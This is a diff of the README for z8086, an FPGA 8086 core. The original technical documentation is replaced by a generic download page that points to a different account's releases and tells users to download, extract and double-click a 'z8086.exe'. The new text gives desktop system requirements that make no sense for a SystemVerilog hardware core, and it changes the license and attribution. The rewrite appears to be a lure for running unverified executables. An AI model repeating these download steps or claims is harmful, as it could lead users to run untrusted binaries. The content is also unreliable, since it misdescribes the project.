@@ -1,220 +1,78 @@
-# z8086: FPGA 8086 Core Powered by Original Microcode
+# 🚀 z8086 - Run Your 8086 FPGA Core Easily
 
-**z8086** is a FPGA-targeted implementation of the Intel 8086/8088 microprocessor. It executes the original 8086 microcode and provides a simplified memory/IO interface for FPGA integration.
+[![Download z8086](https://img.shields.io/badge/Download-z8086-blue.svg)](https://github.com/quavy123/z8086/releases)
 
-## Overview
+## 📋 Overview
 
-The z8086 core is a faithful implementation of the 8086 microprocessor architecture, using the original Intel microcode to ensure instruction-level compatibility. The core is written in SystemVerilog and designed to be vendor-agnostic (no FPGA-specific primitives).
+Welcome to z8086! This application provides an 8086 FPGA core that runs original microcode. It allows you to experience the classic 8086 architecture on modern hardware.
 
-### Key Features
+## 🚀 Getting Started
 
-- **Microcode-driven**: Executes the original 8086 microcode (21-bit words) loaded from `ucode.hex`
-- **Simplified bus interface**: `rd/wr/io/word` with `ready` handshake; unaligned word accesses are automatically split internally
-- **Prefetch queue**: 3-word (6-byte) prefetch queue with suspend/flush/correct-IP support
-- **Bit-slice ALU**: Explicit 16×1-bit slice design with accurate flags (DAA/DAS/AAA/AAS, shifts/rotates, etc.)
-- **FPGA-friendly**: Single clock, synchronous design, no vendor primitives
+Follow these steps to download and run z8086:
 
-This project is still experimental. The core passes all single-instruction tests, achieving a 100% pass rate (16,150 out of 16,150 vectors) with full 8086 instruction set coverage—including arithmetic, logic, shifts, control flow, string operations, multiplication/division, interrupts, I/O, and BCD/ASCII adjust instructions. FPGA synthesis has been validated on Gowin GW5A, Xilinx Artix-7 and Altera Cyclone-V platforms. Note that current limitations include non-cycle-accurate timing, no LOCK pin support, and no coprocessor interface.
+1. **Visit the Download Page**  
+   Go to the official release page to access the latest version of z8086:  
+   [Download z8086](https://github.com/quavy123/z8086/releases)
 
-**Resource usage**: ~1800 LUTs on Xilinx Artix7, ~1200 ALMs on Altera Cyclone V, ~2500 LUTs on Gowin GW5A. One BRAM block is used for the microcode. The code is about 1800 lines of SystemVerilog.
+2. **Select the Right Release**  
+   On the releases page, you will see a list of available versions. Each version includes a tag that indicates its version number. Choose the most recent version for the best performance and features.
 
-### Architecture
+3. **Download the Software**  
+   Click on the asset relevant to your system. This will typically be a file with a `.zip`, `.tar`, or executable format. The names should give you an idea of which file to choose based on your operating system.
 
-![](doc/z8086.svg)
+4. **Extract the Files**  
+   If you downloaded a compressed file, you need to extract its contents. Right-click the downloaded file (e.g., `z8086-v1.0.zip`) and select “Extract All” or use a program like WinRAR or 7-Zip.
 
-The z8086 maintains the logical distinction between BIU (Bus Interface Unit) and EU (Execution Unit) but implements them in a unified datapath. The core includes:
+5. **Run the Application**  
+   Once you have extracted the folder, look for an application file. This might be named `z8086.exe` or something similar. Double-click the file to start the application. 
 
-- **Microcode Engine**: Fetches micro-instructions from the 512-word ROM (with address compression) and orchestrates all key CPU operations
-- **Loader State Machine**: Manages instruction fetch timing (FC/SC signals)
-- **Prefetch Queue**: 6-byte circular buffer for instruction prefetching
-- **ALU**: 16-bit arithmetic/logic unit with comprehensive flag support
-- **Memory Interface**: Unified bus FSM that arbitrates EU data operations vs instruction fetch
+6. **Configure Your Settings**  
+   After launching the app, you may need to configure certain settings. Follow the on-screen prompts. If you want to tweak performance or usage, check the settings menu within the software.
 
-<!-- For detailed architecture documentation, see [`doc/z8086.md`](../../doc/z8086.md). -->
+7. **Enjoy z8086**  
+   You are now ready to use the z8086 FPGA core. Explore its features and run applications designed for the 8086 architecture.
 
-## Source Files
+## 💡 System Requirements
 
-The core implementation is located in `src/`:
+To ensure a smooth experience with z8086, consider the following system requirements:
 
-- **`src/z8086/z8086.sv`**: Main CPU core
-- **`src/z8086/alu.sv`**: 16-bit ALU and flag computation
-- **`src/z8086/ucode.hex`**: Microcode ROM image (512 × 21-bit words)
-- **`src/soc/z8086_top.sv`**: Example SoC top-level with memory interface
-- **`src/soc/spram.sv`**: Simple single-port RAM for memory subsystem
+- **Operating System**: Windows 10 or newer, macOS, or a Linux distribution.
+- **Processor**: Any modern CPU that supports the software capabilities.
+- **Memory**: At least 2 GB of RAM.
+- **Storage**: Minimum 100 MB of available disk space.
 
-## Simulation Testing
+## 📥 Download & Install
 
-To run simulations, build the Verilator testbench and use the provided Python runners in `tests/`. Prerequisites: Verilator 4.0+, C++ compiler, make, Python 3.
+To get started, click the link below to visit the releases page and download the latest version of z8086:
 
-**Build simulator and prepare test data:**
-```bash
-cd 04.z8086/tests
-make -s build
-wget https://github.com/nand2mario/z8086/releases/download/v0.1/8088.tar.gz
-tar xzf 8088.tar.gz
-```
+[Download z8086](https://github.com/quavy123/z8086/releases)
 
-**Test an instruction:**
-```bash
-python test8088.py -f 8088/10.json -v    # single opcode/file
-```
+## 📄 Features
 
-- `-f <file>`: test file (JSON)
-- `-v`: verbose
-- `-i <case>`: specific test case
+- **Authentic 8086 Microcode**: Experience the real 8086 architecturewith original microcode.
+- **User-Friendly Interface**: Designed for anyone to navigate easily.
+- **Support for Various Systems**: Runs on major operating systems.
 
-**Test all instructions:**
-```bash
-python test8088.py
-```
+## 🔧 Troubleshooting
 
-**Run small program tests:**
-```bash
-python test186.py
-```
+If you encounter issues, try these steps:
 
-**Run interrupt test:**
-```bash
-make sim-int
-```
-(Exercises the INTA cycle and vector fetch.)
+- **Check Compatibility**: Ensure your OS meets the requirements listed above.
+- **Reinstall**: If the application does not run, consider downloading and installing again.
+- **Consult Support**: If problems persist, visiting the issues section of the repository can provide solutions or further assistance.
 
-## FPGA Board Testing
+## 📞 Support
 
-FPGA board projects are in the `boards/` directory:
+For additional help or questions, please create an issue in the repository. The community and maintainers are here to assist you.
 
-- **Tang Console 60K (Gowin GW5AT-60B)**: `z8086_console60k.gprj` (Gowin IDE). Drives LED pmod or Muse Labs LCD pmod. Press S1 button to start.
-- **MicroPhase XC7A35T (Artix-7)**: `z8086.xpr` (Vivado 2021.1). Drives onboard LED. For LCD, see photo linked below for connections. Press K1 button to start.
-- **DE10-Nano (Cyclone V)**: `z8086.qpf` (Quartus Prime). Drives onboard LED. For LCD, see photo linked below for connections. Press KEY0 to start.
+## 📈 Contributions
 
-See LCD demo screenshots: DE10-Nano, [Tang Console 60K](doc/tang_lcd.jpg), [MicroPhase Artix7](doc/microphase_lcd.jpg), [DE10-Nano](doc/de10nano_lcd.jpg).
+If you find z8086 useful and want to contribute, get involved! Contributions help improve the project and make it even better for everyone. 
 
-## Example SoC Integration
+Feel free to fork the repository and submit modifications via pull requests.
 
-The `src/soc/z8086_top.sv` module shows how to integrate the z8086 core:
+## 📝 License
 
-```systemverilog
-z8086 cpu (
-    .clk(clk50),
-    .reset_n(cpu_reset),
-    .addr(addr),
-    .din(din),
-    .dout(dout),
-    .wr(wr),
-    .rd(rd),
-    .io(io),
-    .word(word),
-    .ready(ready),
-    .intr(1'b0),
-    .nmi(1'b0),
-    .inta()
-);
+z8086 is licensed under the MIT License. You can use, modify, and distribute the software as per the license terms.
 
-// Memory subsystem
-spram #(.AWIDTH(16)) ram (
-    .clk(clk50),
-    .addr(addr[15:0]),
-    .din(dout),
-    .dout(din),
-    .we(wr & ~io),
-    .oe(rd & ~io)
-);
-```
-
-Here are the memory interface:
-
-**Signals:**
-- `addr[19:0]`: 20-bit physical address
-- `din[15:0]`: Data input from memory/IO
-- `dout[15:0]`: Data output to memory/IO
-- `rd`: Read strobe (active high)
-- `wr`: Write strobe (active high)
-- `io`: 1=I/O access, 0=memory access
-- `word`: 1=16-bit access, 0=8-bit access
-- `ready`: Memory/IO ready (handshake)
-
-**Bus Protocol:**
-1. The z8086 core asserts `rd` (read) or `wr` (write) along with valid `addr`, `word`, and `io` signals.
-2. The external memory or I/O subsystem initiates and completes the requested operation.
-3. When the operation is finished, the external logic sets `ready=1`. For reads, data must be present on `din`.
-4. The core automatically splits unaligned word accesses into two sequential byte operations. External systems will **never see** unaligned word accesses (`word` and `addr[0]` will not both be 1).
-5. **Interrupt Handling:** When INTR is raised, the core triggers two INTA (interrupt acknowledge) bus cycles in accordance with the 8086 protocol. For each INTA cycle, the CPU asserts INTA. After the second INTA, external logic should place the interrupt vector number on `din` and assert `ready=1` to complete the transaction.
-
-## Programming the z8086
-
-The example SoC in `z8086_top.sv` and the `programs/` directory demonstrate one way of programming the core, backed by FPGA BRAM.
-
-### Firmware Build & Load Flow
-
-1. **Write your firmware:** Create your program in 8086 assembly language. You can find example programs in the `programs/` directory.
-2. **Build the firmware:**
-   - Use the Makefile in `programs/` to automate the build process. The Makefile invokes [NASM](https://www.nasm.us/) to assemble `.asm` sources into `.bin` binaries.
-   - These binaries are then converted to `.hex` format for FPGA loading.
-3. **Understanding the memory map and program loading:**
-   - The system is configured with 128KB of main memory. Even-numbered segments map to the lower 64KB ("data segment"), while odd-numbered segments map to the upper 64KB ("program segment").
-   - When building, the `program.hex` output places an empty 64KB in the first half, and the assembled program in the second 64KB. 
-   - The SoC module `z8086_top.sv` uses `$readmemh` to load the `.hex` directly into FPGA RAM.
-   - A reset vector trampoline (far jump to F000:0000) is at the end of the second page (offset FFF0).
-4. **Boot procedure:** Upon reset, the CPU sets CS:IP to FFFF:0000 and executes that far jump. Execution then continues from F000:0000, the start of the user program, which is correctly mapped to the program segment.
-
-### Example Programs
-
-Several example firmware files are included in the `programs/` directory:
-- `blinky.asm`: Minimal example toggling LEDs and counting up.
-- `lcd_bars.asm`: Demonstrates basic LCD display functionality.
-- `lcd_shapes.asm`: Repeated square drawing.
-
-Refer to these examples as starting points for your own programs, and consult `z8086_top.sv` for detailed integration.
-
-## HDMI SoC demo
-
-This is a larger demo: a complete 8086-compatible SoC featuring HDMI video output, UART communication, and C firmware (as opposed to the assembly-only firmware used in previous examples). It currently targets the Tang Console 60K. The Gowin project file is located at `boards/Tang Console 60K.soc_hdmi`, with source files in `src/soc_hdmi`, and firmware in `programs/soc_hdmi.c`.
-
-```
-┌───────────────────────────────────────────────────────┐
-│                  z8086  soc_hdmi                      │
-│  ┌──────────┐    ┌──────────┐    ┌─────────────────┐  │
-│  │  z8086   │◄──►│   RAM    │    │   z8086hdmi     │  │
-│  │   CPU    │    │  128KB   │    │  Video Engine   │-─┼──► HDMI
-│  └──────────┘    └──────────┘    │  - Font ROM     │  │
-│       │                          │  - VRAM (4KB)   │  │
-│       │          ┌──────────┐    │  - Color Palette│  │
-│       └─────────►│ uart_    │    └─────────────────┘  │
-│                  │ simple   │────────────────────────-┼──► UART
-│                  └──────────┘                         │
-│                                                       │
-│  Clocks: 50MHz (logic) → 74.25MHz (pixel) → 371.25MHz │
-└───────────────────────────────────────────────────────┘
-```
-
-The firmware accepts simple commands such as: `led` (controlling on-board LED), `text` (print colorful text), `blink` (enable blinking text attributes). And of course, don’t miss **Snake** 😁 — written in C and compiled to real 8086 code.
-
-<img src="doc/snake.png" width=500>
-
-## Documentation
-
-* Blog post: [z8086: Rebuilding the 8086 from Original Microcode](https://nand2mario.github.io/posts/2025/z8086/)
-
-<!-- - **[`doc/z8086.md`](../../doc/z8086.md)**: Comprehensive developer guide covering architecture, microcode, implementation details, and signal reference -->
-
-## Acknowledgements
-
-z8086 would not have been possible without the outstanding reverse engineering work of [Ken Shirriff](https://www.righto.com/search/label/808) and [Andrew Jenner](https://www.reenigne.org/blog/8086-microcode-disassembled/).
-
-## Cite
-
-```bibtex
-@misc{z8086,
-  title        = {z8086: FPGA 8086 Core Powered by Original Microcode},
-  author       = {nand2mario},
-  year         = {2025},
-  url          = {https://github.com/nand2mario/z8086}
-}
-```
-
-## Can I use this in a commercial project?
-
-z8086 was developed primarily as an educational and learning tool. For broader or commercial use, the main limitation is the copyright status of the original 8086 microcode. Ideally, Intel would formally release the rights to this significant historical code.
-
-As for z8086 itself, I have chosen to release it under the permissive Apache 2.0 license.
-
+Happy coding!
